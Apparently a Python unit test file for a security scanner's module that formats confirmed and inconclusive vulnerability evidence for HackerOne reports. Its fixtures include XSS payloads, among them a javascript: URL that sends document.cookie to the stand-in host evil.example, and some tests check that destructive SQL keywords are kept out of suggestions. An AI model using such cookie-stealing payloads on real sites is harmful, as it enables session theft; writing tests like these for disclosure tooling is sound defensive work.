"""
Unit tests for H1 confirmed-XSS evidence formatting.

The evidence string is pasted into HackerOne for triage, so it must state
plainly what happened (origin -> destination), the risk, and how to reproduce.
"""

from __future__ import annotations

from dast.hackerone import evidence


class TestConfirmedRedirect:
    def _build(self):
        return evidence.build_confirmed_xss(
            proof_url="https://app.acme.com/dl?url=javascript:location='https://evil.example'",
            payload="javascript:location='https://evil.example?c='+document.cookie",
            mechanism="redirect",
            exfil_host="evil.example",
        )

    def test_states_origin_to_destination(self):
        out = self._build()
        assert "app.acme.com -> evil.example" in out

    def test_has_risk_and_reproduction_sections(self):
        out = self._build()
        assert "Risk:" in out
        assert "Reproduction:" in out
        assert "exfiltration" in out.lower()

    def test_includes_proof_url_and_payload(self):
        out = self._build()
        assert "https://app.acme.com/dl" in out
        assert "document.cookie" in out

    def test_confirmed_header(self):
        assert self._build().startswith("CONFIRMED")


class TestConfirmedDialog:
    def test_dialog_message_included(self):
        out = evidence.build_confirmed_xss(
            proof_url="https://app.acme.com/s?q=<script>alert(1)</script>",
            payload="<script>alert(document.domain)</script>",
            mechanism="dialog",
            dialog_message="app.acme.com",
        )
        assert "dialog" in out.lower()
        assert "app.acme.com" in out
        assert "Risk:" in out

    def test_dialog_without_message(self):
        out = evidence.build_confirmed_xss(
            proof_url="https://app.acme.com/s?q=x",
            payload="<script>alert(1)</script>",
            mechanism="dialog",
        )
        assert "CONFIRMED" in out
        assert "Reproduction:" in out


class TestConfirmedReflectedAlert:
    def test_reflected_alert_wording(self):
        out = evidence.build_confirmed_xss(
            proof_url="https://app.acme.com/s?q=x",
            payload="<script>alert(1)</script>",
            mechanism="reflected_alert",
        )
        assert "reflected" in out.lower()
        assert "Risk:" in out


class TestInconclusive:
    def _build(self, vuln_type="xss"):
        return evidence.build_inconclusive(
            vuln_type=vuln_type,
            proof_url="https://app.acme.com/s?q=payload",
            payload="<script>alert(1)</script>",
            reason="No execution observed.",
            observed="Browser only navigated to app.acme.com.",
            llm_advisory="[50%] looks reflected",
        )

    def test_has_why_and_manual_steps(self):
        out = self._build()
        assert "Why:" in out
        assert "How to test manually" in out
        assert "app.acme.com" in out

    def test_includes_payload_suggestions(self):
        out = self._build()
        assert "Suggested payloads" in out
        assert "alert(document.domain)" in out

    def test_llm_advisory_labeled_not_confirmation(self):
        out = self._build()
        assert "not a confirmation" in out.lower()

    def test_sqli_suggestions_are_non_destructive(self):
        out = self._build(vuln_type="sqli")
        assert "SLEEP" in out or "1=1" in out
        # Must not suggest destructive statements.
        assert "DROP" not in out.upper()
        assert "DELETE" not in out.upper()

    def test_extra_suggestions_prepended(self):
        out = evidence.build_inconclusive(
            vuln_type="sqli", proof_url="https://a.com/x", payload="p",
            reason="blocked", extra_suggestions=["use a read-only replica"],
        )
        assert "read-only replica" in out


class TestBroadTypeCoverage:
    """Evidence guidance must cover the many vuln types the validator routes,
    not only XSS — including alias spellings."""

    CONCRETE_TYPES = [
        "xss", "sqli", "ssti", "lfi", "rce", "xxe", "idor", "csrf",
        "open_redirect", "ssrf", "auth_bypass", "privilege_escalation",
        "info_disclosure", "business_logic", "dns_takeover",
    ]

    def test_all_concrete_types_have_manual_steps(self):
        for t in self.CONCRETE_TYPES:
            out = evidence.build_inconclusive(
                vuln_type=t, proof_url="https://a.com/x", payload="p", reason="r",
            )
            assert "How to test manually" in out, f"{t} has no manual steps"

    def test_aliases_resolve_to_guidance(self):
        # An alias must yield the SAME guidance as its canonical type.
        for alias, canonical in [
            ("path_traversal", "lfi"),
            ("cmdi", "rce"),
            ("template_injection", "ssti"),
            ("subdomain_takeover", "dns_takeover"),
        ]:
            alias_out = evidence.build_inconclusive(
                vuln_type=alias, proof_url="https://a.com/x", payload="p", reason="r",
            )
            canon_out = evidence.build_inconclusive(
                vuln_type=canonical, proof_url="https://a.com/x", payload="p", reason="r",
            )
            assert "How to test manually" in alias_out
            assert alias_out == canon_out, f"{alias} did not resolve to {canonical}"

    def test_unknown_type_degrades_gracefully(self):
        # No type-specific guidance, but the core (Why + reason) must still render.
        out = evidence.build_inconclusive(
            vuln_type="unknown", proof_url="https://a.com/x", payload="p",
            reason="some reason",
        )
        assert "Why:" in out
        assert "some reason" in out

    def test_sqli_suggestions_never_destructive(self):
        out = evidence.build_inconclusive(
            vuln_type="sqli", proof_url="https://a.com/x", payload="p", reason="r",
        )
        up = out.upper()
        assert "DROP" not in up and "DELETE" not in up and "TRUNCATE" not in up


class TestError:
    def test_error_states_cause_and_manual_steps(self):
        out = evidence.build_error(
            vuln_type="xss",
            proof_url="https://app.acme.com/s?q=x",
            error="Navigation timeout",
            likely_cause="Target unreachable or slow.",
        )
        assert "Error:" in out
        assert "Likely cause:" in out
        assert "How to test manually" in out
        assert "Navigation timeout" in out
